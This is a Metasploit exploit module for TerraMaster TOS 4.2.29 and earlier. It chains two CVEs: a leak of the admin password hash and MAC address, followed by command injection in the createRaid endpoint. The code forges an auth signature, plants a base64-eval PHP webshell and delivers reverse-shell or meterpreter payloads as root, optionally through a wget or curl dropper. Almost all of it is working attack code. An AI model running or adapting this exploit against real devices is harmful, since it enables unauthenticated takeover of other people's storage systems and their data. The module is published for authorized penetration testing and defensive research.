##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'digest/md5'
require 'time'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  include Msf::Exploit::FileDropper
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'TerraMaster TOS 4.2.29 or lower - Unauthenticated RCE chaining CVE-2022-24990 and CVE-2022-24989',
        'Description' => %q{
          This module exploits an unauthenticated remote code execution vulnerability in TerraMaster TOS 4.2.29
          and lower by chaining two existing vulnerabilities, CVE-2022-24990 "Leaking sensitive information"
          and CVE-2022-24989, "Authenticated remote code execution".
          Exploiting vulnerable endpoint `api.php?mobile/webNasIPS` leaking sensitive information such as admin password
          hash and mac address, the attacker can achieve unauthenticated access and use another vulnerable endpoint
          `api.php?mobile/createRaid` with POST parameters `raidtype` and `diskstring` to upload a webshell and
          execute remote code as root on TerraMaster NAS devices.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die-gr3y <h00die.gr3y[at]gmail.com>', # MSF module contributor
          'Octagon Networks', # Discovery
          '0xf4n9x' # POC
        ],
        'References' => [
          ['CVE', '2022-24990'],
          ['CVE', '2022-24989'],
          ['URL', 'https://octagon.net/blog/2022/03/07/cve-2022-24990-terrmaster-tos-unauthenticated-remote-command-execution-via-php-object-instantiation/'],
          ['URL', 'https://github.com/0xf4n9x/CVE-2022-24990'],
          ['URL', 'https://attackerkb.com/topics/h8YKVKx21t/cve-2022-24990']
        ],
        'DisclosureDate' => '2022-03-07',
        'Platform' => ['unix', 'linux'],
        'Arch' => [ARCH_CMD, ARCH_PHP, ARCH_X64, ARCH_X86, ARCH_AARCH64],
        'Privileged' => true,
        'Targets' => [
          [
            'PHP',
            {
              'Platform' => 'php',
              'Arch' => ARCH_PHP,
              'Type' => :php,
              'DefaultOptions' => {
                'PAYLOAD' => 'php/meterpreter/reverse_tcp'
              }
            }
          ],
          [
            'Unix Command',
            {
              'Platform' => 'unix',
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/unix/reverse_bash'
              }
            }
          ],
          [
            'Linux Dropper',
            {
              'Platform' => 'linux',
              'Arch' => [ARCH_X64, ARCH_X86, ARCH_AARCH64],
              'Type' => :linux_dropper,
              'CmdStagerFlavor' => ['printf', 'echo', 'bourne', 'wget', 'curl'],
              'DefaultOptions' => {
                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'
              }
            }
          ]
        ],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'RPORT' => 8181,
          'SSL' => false
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )
    register_options([
      OptString.new('TARGETURI', [true, 'Path to Terramaster Web console', '/']),
      OptString.new('WEBSHELL', [false, 'Web shell name with extension .php. Name will be randomly generated if left unset.', nil]),
      OptEnum.new('COMMAND',
                  [true, 'Use PHP command function', 'passthru', %w[passthru shell_exec system exec]], conditions: %w[TARGET != 0])
    ])
  end

  def get_data
    # Initialise variable data to store the leaked data
    @data = {}

    # Get the data by exploiting the LFI vulnerability through vulnerable endpoint `api.php?mobile/webNasIPS`
    # CVE-2022-24990
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'module', 'api.php?mobile/webNasIPS'),
      'headers' => {
        'User-Agent' => 'TNAS'
      }
    })
    if res && res.code == 200 && res.body.include?('webNasIPS successful')
      # Parse the JSON response and get the data such as admin password hash and MAC address
      res_json = res.get_json_document
      unless res_json.blank?
        @data['password'] = res_json['data'].split('PWD:')[1].split('SAT')[0].strip
        @data['mac'] = res_json['data'].split('mac":"')[1].split('"')[0].tr(':', '').strip
        @data['key'] = @data['mac'][6..11] # last three MAC address entries
        @data['timestamp'] = Time.new.to_i.to_s
        # derive signature
        @data['signature'] = tos_encrypt_str(@data['key'], @data['timestamp'])
      end
    end
  end

  def tos_encrypt_str(key, str_to_encrypt)
    id = key + str_to_encrypt
    return Digest::MD5.hexdigest(id.encode('utf-8'))
  end

  def upload_webshell
    # randomize file name if option WEBSHELL is not set
    @webshell_name = (datastore['WEBSHELL'].blank? ? "#{Rex::Text.rand_text_alpha(8..16)}.php" : datastore['WEBSHELL'].to_s)

    @post_param = Rex::Text.rand_text_alphanumeric(1..8)
    @get_param = Rex::Text.rand_text_alphanumeric(1..8)

    # Upload PHP payload using vulnerable endpoint `api.php?mobile/createRaid`
    # CVE-2022-24989
    webshell = if target['Type'] == :php
                 "echo '<?php @eval(base64_decode(\$_POST[\"#{@post_param}\"]));?>' > #{@webshell_name}"
               else
                 "echo '<?=\$_GET[\"#{@get_param}\"](base64_decode(\$_POST[\"#{@post_param}\"]));?>' > #{@webshell_name}"
               end
    diskstring = Rex::Text.rand_text_alpha_upper(4..8)

    return send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'module', 'api.php?mobile/createRaid'),
      'ctype' => 'application/x-www-form-urlencoded',
      'headers' => {
        'User-Agent' => 'TNAS',
        'Authorization' => @data['password'],
        'Signature' => @data['signature'],
        'Timestamp' => @data['timestamp'],
        'Upgrade-Insecure-Requests' => '1'
      },
      'vars_post' => {
        'raidtype' => ';' + webshell.to_s,
        'diskstring' => diskstring.to_s
      }
    })
  end

  def get_terramaster_info
    # get Terramaster CPU architecture (X64 or ARM64) and TOS version
    @terramaster = {}
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'tos', 'index.php?user/login')
    })

    if res && res.body && res.code == 200
      # get the version information from the request response like below:
      # <link href="./static/style/bootstrap.css?ver=TOS3_A1.0_4.2.07" rel="stylesheet"/>
      return if res.body.match(/ver=.+?"/).nil?

      version = res.body.match(/ver=.+?"/)[0]
      # check if architecture is ARM64 or X64
      if version.match(/_A/)
        @terramaster['cpu_arch'] = 'ARM64'
      elsif version.match(/_S/) || version.match(/_Q/)
        @terramaster['cpu_arch'] = 'X64'
      else
        @terramaster['cpu_arch'] = 'UNKNOWN'
      end

      # strip TOS version number and remove trailing double quote.
      @terramaster['tos_version'] = version.split('.0_')[1].chop
    end
  end

  def execute_php(cmd, _opts = {})
    payload = Base64.strict_encode64(cmd)
    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'module', @webshell_name),
      'ctype' => 'application/x-www-form-urlencoded',
      'vars_post' => {
        @post_param => payload
      }
    })
  end

  def execute_command(cmd, _opts = {})
    payload = Base64.strict_encode64(cmd)
    php_cmd_function = datastore['COMMAND']
    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'module', @webshell_name),
      'ctype' => 'application/x-www-form-urlencoded',
      'vars_get' => {
        @get_param => php_cmd_function
      },
      'vars_post' => {
        @post_param => payload
      }
    })
  end

  def check
    get_terramaster_info
    return CheckCode::Safe if @terramaster.empty?

    if Rex::Version.new(@terramaster['tos_version']) <= Rex::Version.new('4.2.29')
      return CheckCode::Vulnerable("TOS version is #{@terramaster['tos_version']} and CPU architecture is #{@terramaster['cpu_arch']}.")
    end

    CheckCode::Safe("TOS version is #{@terramaster['tos_version']} and CPU architecture is #{@terramaster['cpu_arch']}.")
  end

  def exploit
    # get the leaked data
    get_data
    fail_with(Failure::BadConfig, 'Can not retrieve the leaked data.') if @data.empty?

    res = upload_webshell
    fail_with(Failure::UnexpectedReply, 'Web shell upload error.') unless res && (res.code == 200) && res.body.include?('createRaid successful') && res.body.include?('true')
    register_file_for_cleanup(@webshell_name.to_s)

    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
    case target['Type']
    when :php
      execute_php(payload.encoded)
    when :unix_cmd
      execute_command(payload.encoded)
    when :linux_dropper
      # Don't check the response here since the server won't respond
      # if the payload is successfully executed.
      execute_cmdstager(linemax: 65536)
    end
  end
end
